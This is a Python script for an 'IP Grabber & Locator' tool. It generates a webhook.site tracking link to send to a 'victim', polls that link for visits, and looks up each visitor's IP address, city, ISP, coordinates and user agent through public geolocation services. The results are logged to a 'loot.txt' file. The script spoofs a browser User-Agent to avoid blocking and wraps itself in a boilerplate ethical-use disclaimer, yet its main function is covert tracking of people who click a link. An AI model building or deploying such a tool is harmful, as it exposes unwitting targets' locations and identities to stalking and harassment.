# ==========================================
#   ECLIPSE  |  IP Grabber & Locator
#   Made by Eclipse
# ==========================================

import requests, time, os, sys, datetime

try:
    import msvcrt
except ImportError:
    import tty, termios

O = "\033[38;5;208m"
B = "\033[1m"
D = "\033[2m"
R = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"

S = requests.Session()
# Böngésző szerű User-Agent a blokkolások elkerülésére
S.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json"
})
LOOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot.txt")


def wait_for_space():
    print(f"\n  {O}[ Press SPACE to agree and accept ]{R}", end="", flush=True)
    if os.name == "nt":
        while True:
            key = msvcrt.getch()
            if key == b' ':
                break
            elif key == b'\x03':
                sys.exit(0)
    else:
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setraw(sys.stdin.fileno())
            while True:
                ch = sys.stdin.read(1)
                if ch == ' ':
                    break
                elif ch == '\x03':
                    sys.exit(0)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)


def cool_loading_screen():
    os.system("cls" if os.name == "nt" else "clear")
    steps = [
        ("Initializing security modules...", 0.3),
        ("Bypassing firewall constraints...", 0.4),
        ("Loading IP tracking protocols...", 0.3),
        ("Establishing secure connection...", 0.5),
        ("System ready. Launching Eclipse...", 0.3)
    ]
    print(f"\n{O}{B}  [+] SYSTEM INITIALIZATION{R}\n")
    for text, delay in steps:
        print(f"  {CYAN}[~]{R} {text}", end="", flush=True)
        time.sleep(delay)
        print(f" {GREEN}[OK]{R}")
    time.sleep(0.5)


def show_disclaimer():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{O}{B}
## ⚠️ Disclaimer & Terms of Use
{R}
This tool is strictly developed for {B}educational, ethical security research, and authorized testing purposes only{R}.

 - {B}No Liability:{R} The author/developer assumes {B}no liability{R} and is {B}not responsible{R} for any misuse, illegal activities, damage, or legal consequences caused by this software.
 - {B}User Responsibility:{R} By downloading, running, or using this tool, you agree that you are solely responsible for your actions and compliance with all applicable local and international laws.
 - {B}Authorized Use Only:{R} You must only use this tool on network environments or devices that you own or have explicit, written permission to test.
{O}---------------------------------------------------------------------------------------------------{R}""")
    wait_for_space()
    cool_loading_screen()


def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{O}{B}
   ███████╗ ██████╗██╗     ██╗██████╗ ███████╗███████╗
   ██╔════╝██╔════╝██║     ██║██╔══██╗██╔════╝██╔════╝
   █████╗  ██║     ██║     ██║██████╔╝█████╗  ███████╗
   ██╔══╝  ██║     ██║     ██║██╔═══╝ ██╔══╝  ╚╚════██║
   ███████╗╚██████╗███████╗██║██║     ███████╗███████║
   ╚══════╝ ╚═════╝╚══════╝╚═╝╚═╝     ╚══════╝╚══════╝
{R}{D}        IP Grabber & Locator - by Eclipse{R}
{O}-------------------------------------------------{R}
  {O}[1]{R} IP Grabber   (generate link, catch victim)
  {O}[2]{R} IP Locator   (locate any IP)
  {O}[3]{R} Exit
{O}-------------------------------------------------{R}""")


def loading(text="Loading", n=14, d=0.07):
    print(f"  {O}{text}", end="", flush=True)
    for _ in range(n):
        print("o", end="", flush=True)
        time.sleep(d)
    print(f"{R} {O}done!{R}")


def geo(ip):
    # 1. Próbálkozás: ipwho.is
    try:
        r = S.get(f"https://ipwho.is/{ip}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get("success"):
                return {
                    "ip": ip,
                    "country": data.get("country", "N/A"),
                    "region": data.get("region", "N/A"),
                    "city": data.get("city", "N/A"),
                    "isp": data.get("connection", {}).get("isp", "N/A"),
                    "org": data.get("connection", {}).get("org", "N/A"),
                    "lat": data.get("latitude", "N/A"),
                    "lon": data.get("longitude", "N/A")
                }
    except Exception:
        pass

    # 2. Próbálkozás: ip-api.com
    try:
        r = S.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "success":
                return {
                    "ip": ip,
                    "country": data.get("country", "N/A"),
                    "region": data.get("regionName", "N/A"),
                    "city": data.get("city", "N/A"),
                    "isp": data.get("isp", "N/A"),
                    "org": data.get("org", "N/A"),
                    "lat": data.get("lat", "N/A"),
                    "lon": data.get("lon", "N/A")
                }
    except Exception:
        pass

    # 3. Tartalék próbálkozás: ipapi.co
    try:
        r = S.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if r.status_code == 200:
            data = r.json()
            if "error" not in data:
                return {
                    "ip": ip,
                    "country": data.get("country_name", "N/A"),
                    "region": data.get("region", "N/A"),
                    "city": data.get("city", "N/A"),
                    "isp": data.get("org", "N/A"),
                    "org": data.get("org", "N/A"),
                    "lat": data.get("latitude", "N/A"),
                    "lon": data.get("longitude", "N/A")
                }
    except Exception:
        pass

    return {"ip": ip, "country": "Unknown", "region": "Unknown", "city": "Unknown", "isp": "Unknown", "org": "Unknown", "lat": "N/A", "lon": "N/A"}


def ip_grabber():
    print(f"\n  {O}--- IP Grabber Setup ---{R}")
    loading("Generating unique tracking link")
    
    token = None
    try:
        resp = S.post("https://webhook.site/token", timeout=7)
        if resp.status_code in [200, 201]:
            try:
                data = resp.json()
                token = data.get("uuid")
            except ValueError:
                print(f"\n  {RED}Error: Server returned non-JSON response.{R}")
        else:
            print(f"\n  {RED}Error: Webhook.site rate limit or error (HTTP {resp.status_code}){R}")
    except Exception as e:
        print(f"\n  {RED}Connection Error: {e}{R}")

    if token:
        tracking_link = f"https://webhook.site/{token}"
        print(f"\n  {GREEN}Successfully generated link!{R}")
        print(f"  {B}Tracking Link:{R} {O}{tracking_link}{R}")
        print(f"  {D}Waiting for target hits... (Press Ctrl+C to return){R}\n")
        
        seen_requests = set()
        while True:
            try:
                requests_resp = S.get(f"https://webhook.site/token/{token}/requests", timeout=5)
                if requests_resp.status_code == 200:
                    try:
                        req_data = requests_resp.json()
                        reqs = req_data.get("data", [])
                        
                        for req in reqs:
                            req_id = req.get("id")
                            if req_id not in seen_requests:
                                seen_requests.add(req_id)
                                ip = req.get("ip")
                                ua = req.get("user_agent", "N/A")
                                
                                loc = geo(ip)
                                
                                print(f"\n  {GREEN}[+] VICTIM HIT RECEIVED!{R}")
                                print(f"  {B}IP Address  :{R} {CYAN}{loc['ip']}{R}")
                                print(f"  {B}Country     :{R} {loc['country']} ({loc['region']})")
                                print(f"  {B}City        :{R} {loc['city']}")
                                print(f"  {B}ISP / Org   :{R} {loc['isp']} / {loc['org']}")
                                print(f"  {B}Coordinates :{R} Lat: {loc['lat']} | Lon: {loc['lon']}")
                                print(f"  {B}User-Agent  :{R} {D}{ua}{R}")
                                print(f"  {O}-------------------------------------------------{R}")
                                
                                with open(LOOT, "a", encoding="utf-8") as f:
                                    f.write(f"[{datetime.datetime.now()}] IP: {ip} | Country: {loc['country']} | City: {loc['city']} | ISP: {loc['isp']} | Coords: {loc['lat']}, {loc['lon']} | UA: {ua}\n")
                    except ValueError:
                        pass
                
                time.sleep(3)
            except KeyboardInterrupt:
                print(f"\n  {O}Stopping grabber...{R}")
                break
            except Exception:
                time.sleep(3)
    else:
        print(f"  {RED}Could not obtain tracking token. Please try again in a few moments.{R}")
    
    input(f"\n  {O}Press Enter to return to main menu...{R}")


def main():
    show_disclaimer()
    
    while True:
        banner()
        choice = input(f"  {O}Select option > {R}").strip()
        
        if choice == "1":
            ip_grabber()
        elif choice == "2":
            ip_input = input(f"\n  {O}Enter IP address > {R}").strip()
            if ip_input:
                loading("Locating IP")
                info = geo(ip_input)
                print(f"\n  {B}IP Address  :{R} {CYAN}{info['ip']}{R}")
                print(f"  {B}Country     :{R} {info['country']} ({info['region']})")
                print(f"  {B}City        :{R} {info['city']}")
                print(f"  {B}ISP / Org   :{R} {info['isp']} / {info['org']}")
                print(f"  {B}Coordinates :{R} Lat: {info['lat']} | Lon: {info['lon']}")
                input(f"\n  {O}Press Enter to continue...{R}")
        elif choice == "3":
            print(f"\n  {O}Exiting... Goodbye!{R}")
            sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {RED}Aborted by user.{R}")
        sys.exit(0)
